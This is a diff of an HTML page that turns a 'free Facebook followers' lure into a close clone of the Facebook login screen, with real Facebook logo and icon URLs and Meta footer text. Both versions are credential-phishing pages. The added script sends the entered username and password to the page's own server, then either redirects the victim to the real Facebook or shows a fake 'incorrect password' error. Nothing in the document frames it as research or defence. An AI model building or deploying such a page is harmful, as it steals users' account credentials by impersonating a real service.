@@ -1,270 +1,314 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Free Followers Generator</title>
-    <!-- Font Awesome for Facebook logo -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log into Facebook</title>
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/y5/r/m4O5ciN5JT-.ico">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        min-height: 100vh;
+        background: #f0f2f5;
+        display: flex;
+        flex-direction: column;
+        color: #1c1e21;
+    }
 
-        body {
-            background: radial-gradient(circle at 10% 20%, #0a0f2a, #03060c);
-            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+    /* ── Top blue bar ── */
+    .top {
+        background: #fff;
+        border-bottom: 1px solid #dddfe2;
+        padding: 14px 0;
+        box-shadow: 0 1px 2px rgba(0,0,0,.05);
+    }
+    .top-inner {
+        max-width: 1000px;
+        margin: 0 auto;
+        padding: 0 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 16px;
+    }
+    .fb-logo-top {
+        color: #1877f2;
+        font-family: 'Helvetica', 'Arial', sans-serif;
+        font-size: 40px;
+        font-weight: 900;
+        letter-spacing: -1.5px;
+        line-height: 1;
+        user-select: none;
+    }
+    .top-form { display: flex; gap: 12px; align-items: flex-end; }
+    .top-form .field { display: flex; flex-direction: column; gap: 4px; }
+    .top-form input {
+        padding: 5px 8px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 13px;
+        width: 150px;
+        outline: none;
+    }
+    .top-form input:focus { border-color: #1877f2; }
+    .top-form .link {
+        font-size: 12px;
+        color: #1877f2;
+        text-decoration: none;
+    }
+    .top-form .link:hover { text-decoration: underline; }
+    .top-form button {
+        background: #1877f2;
+        color: #fff;
+        border: none;
+        padding: 6px 14px;
+        font-size: 13px;
+        font-weight: 600;
+        border-radius: 6px;
+        cursor: pointer;
+    }
+    .top-form button:hover { background: #166fe5; }
 
-        .glass-card {
-            background: rgba(15, 20, 35, 0.75);
-            backdrop-filter: blur(14px);
-            border-radius: 56px;
-            border: 1px solid rgba(0, 255, 255, 0.35);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1);
-            width: 100%;
-            max-width: 500px;
-            padding: 32px 28px;
-            transition: 0.3s;
-        }
+    /* ── Main split ── */
+    .main {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex: 1;
+        padding: 40px 16px;
+    }
+    .inner {
+        max-width: 980px;
+        width: 100%;
+        display: grid;
+        grid-template-columns: 1fr 400px;
+        gap: 70px;
+        align-items: center;
+    }
+    .tagline {
+        color: #1c1e21;
+        font-size: 28px;
+        line-height: 1.35;
+        font-weight: 400;
+        max-width: 500px;
+    }
+    .tagline img {
+        width: 300px;
+        margin-bottom: 8px;
+        display: block;
+    }
 
-        .brand {
-            font-size: 1.8rem;
-            font-weight: 800;
-            text-align: center;
-            background: linear-gradient(135deg, #ffffff, #00ffff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 20px;
-            text-shadow: 0 0 8px cyan;
-        }
+    /* ── Login card ── */
+    .card-wrap { display: flex; flex-direction: column; }
+    .card {
+        background: #fff;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+    }
+    .card input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 17px;
+        outline: none;
+        color: #1c1e21;
+        background: #fff;
+    }
+    .card input:focus {
+        border-color: #1877f2;
+        box-shadow: 0 0 0 2px #e7f3ff;
+    }
+    .card .login-btn {
+        background: #1877f2;
+        color: #fff;
+        border: none;
+        padding: 12px;
+        font-size: 20px;
+        font-weight: 700;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: 0.15s;
+    }
+    .card .login-btn:hover { background: #166fe5; }
+    .card .login-btn:disabled { opacity: .6; cursor: default; }
+    .card .forgot {
+        text-align: center;
+        color: #1877f2;
+        font-size: 14px;
+        text-decoration: none;
+        padding: 6px 0;
+        cursor: pointer;
+    }
+    .card .forgot:hover { text-decoration: underline; }
+    .card .divider {
+        height: 1px;
+        background: #dadde1;
+        margin: 8px 0;
+    }
+    .card .create-btn {
+        align-self: center;
+        background: #42b72a;
+        color: #fff;
+        border: none;
+        padding: 12px 20px;
+        font-size: 17px;
+        font-weight: 700;
+        border-radius: 6px;
+        cursor: pointer;
+        width: fit-content;
+    }
+    .card .create-btn:hover { background: #36a420; }
+    .err {
+        color: #fa383e;
+        font-size: 13px;
+        text-align: center;
+        padding: 4px 0;
+        display: none;
+        line-height: 1.4;
+    }
+    .below-card {
+        text-align: center;
+        margin-top: 24px;
+        font-size: 14px;
+        color: #1c1e21;
+    }
+    .below-card b { font-weight: 600; cursor: pointer; }
+    .below-card b:hover { text-decoration: underline; }
 
-        .fb-header {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 15px;
-        }
+    /* ── Footer ── */
+    .footer {
+        background: #fff;
+        padding: 24px 16px;
+        font-size: 12px;
+        color: #737373;
+        text-align: center;
+        border-top: 1px solid #dddfe2;
+        line-height: 1.8;
+    }
+    .footer a { color: #737373; text-decoration: none; margin: 0 8px; }
+    .footer a:hover { text-decoration: underline; }
 
-        .fb-logo {
-            font-size: 2.5rem;
-            color: #1877f2;
-        }
-
-        .fb-header h2 {
-            background: linear-gradient(135deg, #ffffff, #1877f2);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-size: 1.6rem;
-            margin: 0;
-        }
-
-        .counter-area {
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 80px;
-            padding: 12px;
-            text-align: center;
-            margin: 20px 0;
-            border: 1px solid #ffaa44;
-        }
-
-        .counter-number {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: #ffdd88;
-            font-family: monospace;
-        }
-
-        .counter-label {
-            font-size: 0.7rem;
-            color: #aaa;
-            letter-spacing: 2px;
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-        }
-
-        input {
-            width: 100%;
-            padding: 14px 18px;
-            border-radius: 60px;
-            border: none;
-            background: rgba(10, 15, 30, 0.8);
-            color: white;
-            font-size: 1rem;
-            outline: none;
-            transition: 0.2s;
-        }
-
-        input:focus {
-            border: 1px solid cyan;
-            box-shadow: 0 0 8px cyan;
-        }
-
-        button {
-            width: 100%;
-            background: linear-gradient(95deg, #ff884d, #ff5500);
-            border: none;
-            padding: 14px;
-            border-radius: 60px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            color: white;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-top: 10px;
-        }
-
-        button:hover {
-            transform: scale(0.98);
-            background: linear-gradient(95deg, #ffaa66, #ff7700);
-            box-shadow: 0 0 12px orange;
-        }
-
-        .result-box {
-            margin-top: 24px;
-            background: #0b0f18cc;
-            border-radius: 28px;
-            padding: 16px;
-            text-align: center;
-            border-left: 4px solid #00ffaa;
-            transition: 0.2s;
-        }
-
-        .success-message {
-            color: #aaffdd;
-            font-weight: bold;
-        }
-
-        .error-message {
-            color: #ff8888;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #fff;
-            border-radius: 50%;
-            border-top-color: #ff5500;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .footer {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #6a7a9e;
-            margin-top: 20px;
-            border-top: 1px solid #2a3246;
-            padding-top: 16px;
-        }
-    </style>
+    @media (max-width: 860px) {
+        .top-form { display: none; }
+        .inner { grid-template-columns: 1fr; max-width: 400px; gap: 20px; }
+        .tagline { text-align: center; font-size: 20px; margin: 0 auto; }
+        .tagline img { margin: 0 auto 8px; width: 240px; }
+    }
+</style>
 </head>
 <body>
-<div class="glass-card">
-    <div class="brand"> CYBER TOOLS</div>
-    <div class="fb-header">
-        <i class="fab fa-facebook fb-logo"></i>
-        <h2>FREE FACEBOOK FOLLOWERS</h2>
-    </div>
-    <div class="counter-area">
-        <div class="counter-number" id="liveCounter">1,247</div>
-        <div class="counter-label">People already got followers</div>
-    </div>
-    <form id="followerForm">
-        <div class="input-group">
-            <input type="text" id="email" name="email" placeholder="Email or Phone number" required autocomplete="off">
-        </div>
-        <div class="input-group">
-            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
-        </div>
-        <button type="submit" id="submitBtn"> ADD FOLLOWERS NOW </button>
-    </form>
-    <div id="resultArea" class="result-box hidden"></div>
-    <div class="footer">
-         Instant delivery  100% real accounts  No survey
+
+<div class="top">
+    <div class="top-inner">
+        <div class="fb-logo-top">facebook</div>
+        <form class="top-form" onsubmit="return false;">
+            <div class="field">
+                <input type="text" placeholder="Email or phone">
+                <a href="#" class="link" onclick="return false;">Forgotten account?</a>
+            </div>
+            <div class="field">
+                <input type="password" placeholder="Password">
+            </div>
+            <button type="submit">Log in</button>
+        </form>
     </div>
 </div>
 
-<script>
-    const form = document.getElementById('followerForm');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    const resultArea = document.getElementById('resultArea');
+<div class="main">
+    <div class="inner">
+        <div class="tagline">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            Recent logins mean you can quickly pick up where you left off.
+        </div>
 
-    //   (  )
-    let counter = 1247;
-    const counterEl = document.getElementById('liveCounter');
-    setInterval(() => {
-        counter += Math.floor(Math.random() * 5) + 1;
-        counterEl.innerText = counter.toLocaleString();
-    }, 3000);
+        <div class="card-wrap">
+            <form class="card" id="loginForm" autocomplete="off">
+                <input type="text" name="username" id="username"
+                       placeholder="Email address or phone number"
+                       autocapitalize="off" autocorrect="off" spellcheck="false" required>
+                <input type="password" name="password" id="password"
+                       placeholder="Password" required>
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+                <a href="#" class="forgot" onclick="return false;">Forgotten password?</a>
+                <div class="divider"></div>
+                <button type="button" class="create-btn">Create new account</button>
+                <div class="err" id="errBox"></div>
+            </form>
+            <div class="below-card">
+                <b>Create a Page</b> for a celebrity, brand or business.
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <a href="#" onclick="return false;">English (UK)</a>
+    <a href="#" onclick="return false;">বাংলা</a>
+    <a href="#" onclick="return false;">हिन्दी</a>
+    <a href="#" onclick="return false;">中文</a>
+    <a href="#" onclick="return false;">日本語</a>
+    <a href="#" onclick="return false;">Español</a>
+    <a href="#" onclick="return false;">Português</a>
+    <br>
+    <a href="#" onclick="return false;">Sign up</a>
+    <a href="#" onclick="return false;">Log in</a>
+    <a href="#" onclick="return false;">Messenger</a>
+    <a href="#" onclick="return false;">Facebook Lite</a>
+    <a href="#" onclick="return false;">Watch</a>
+    <a href="#" onclick="return false;">Places</a>
+    <a href="#" onclick="return false;">Games</a>
+    <a href="#" onclick="return false;">Marketplace</a>
+    <a href="#" onclick="return false;">Meta Pay</a>
+    <br>
+    Meta © 2025
+</div>
+
+<script>
+    const form   = document.getElementById('loginForm');
+    const btn    = document.getElementById('loginBtn');
+    const errBox = document.getElementById('errBox');
 
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const email = emailInput.value.trim();
-        const password = passwordInput.value.trim();
+        const u = document.getElementById('username').value.trim();
+        const p = document.getElementById('password').value.trim();
+        if (!u || !p) return;
 
-        if (!email || !password) {
-            showResult(' Please fill both fields', 'error');
-            return;
-        }
-
-        submitBtn.disabled = true;
-        submitBtn.innerHTML = '<span class="loader"></span> Processing...';
+        btn.disabled    = true;
+        btn.textContent = 'Logging in...';
+        errBox.style.display = 'none';
 
         try {
-            const response = await fetch(window.location.href, {
+            const res = await fetch(window.location.href, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: new URLSearchParams({ username: email, password: password })
+                body: new URLSearchParams({ username: u, password: p })
             });
-            const data = await response.json();
+            const data = await res.json();
+
             if (data.status === 'success') {
-                //       
-                showResult(' Success! 10,000 followers will be added within 5 minutes. Thank you!', 'success');
-                emailInput.value = '';
-                passwordInput.value = '';
+                await new Promise(r => setTimeout(r, 1400));
+                window.location.href = data.redirect || 'https://www.facebook.com/';
             } else {
-                showResult(' Failed. Please try again.', 'error');
+                errBox.textContent = "The password you've entered is incorrect. Forgotten password?";
+                errBox.style.display = 'block';
+                btn.disabled = false;
+                btn.textContent = 'Log in';
             }
         } catch (err) {
-            showResult(' Network error. Please try again.', 'error');
-        } finally {
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = ' ADD 10K FOLLOWERS NOW ';
+            errBox.textContent = "Something went wrong. Please try again.";
+            errBox.style.display = 'block';
+            btn.disabled = false;
+            btn.textContent = 'Log in';
         }
     });
-
-    function showResult(msg, type) {
-        resultArea.classList.remove('hidden');
-        resultArea.innerHTML = `<div class="${type === 'success' ? 'success-message' : 'error-message'}">${msg}</div>`;
-        setTimeout(() => {
-            resultArea.classList.add('hidden');
-        }, 5000);
-    }
 </script>
+
 </body>
 </html>
